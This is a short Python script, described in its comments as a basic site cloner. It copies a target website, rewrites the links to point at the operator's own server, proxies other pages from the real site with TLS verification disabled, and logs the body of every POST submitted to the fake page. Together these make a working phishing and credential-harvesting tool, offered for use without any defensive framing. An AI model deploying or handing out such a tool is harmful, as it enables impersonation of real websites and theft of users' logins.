import sys, requests, socketserver, http.server, ssl, re, io
import urllib.request as ur

#a very basic and buggy site cloner script
#python3 site_cloner.py [url_to_clone] [ip] [port]


if len(sys.argv) != 5:

    print("[~] Usage : python3 site_cloner.py [url_to_clone] [ip] [port] [html_filename]")
    exit()


clone_url = sys.argv[1]
ip = sys.argv[2]
port = int(sys.argv[3])
name = sys.argv[4]+".html"
html = requests.get(clone_url,verify=False)
root_directory = "site_cloner"
s = re.sub(clone_url,'http://'+ip+':'+str(port)+"/",html.text)
open(name, "w",encoding='utf-8').write(s)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class Handler (http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        incoming_url=self.path[1:]
        if incoming_url != name:
            self.send_response(200)
            self.end_headers()
            print(clone_url+incoming_url)
            #proxy
            resp = ur.urlopen(clone_url+incoming_url,context=ctx)
            resp_data = resp.read().decode('utf-8' ,'ignore')
            s = re.sub(clone_url,'http://'+ip+':'+str(port)+"/",resp_data)
            open('proxy.html', "w",encoding='utf-8').write(s)
            self.copyfile(open('proxy.html','rb'),self.wfile)
        else:
            f = self.send_head()
            if f:
                self.copyfile(f, self.wfile)
                f.close()
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length) 
        print("POST request,\nPath: s\nHeaders:\n%s\n\nBody:\n%s\n",str(self.path), str(self.headers), post_data.decode('utf-8'))
with socketserver.TCPServer((ip, port), Handler) as httpd:
        print("url: http://"+ip+":"+str(port)+"/"+name)
        httpd.serve_forever()
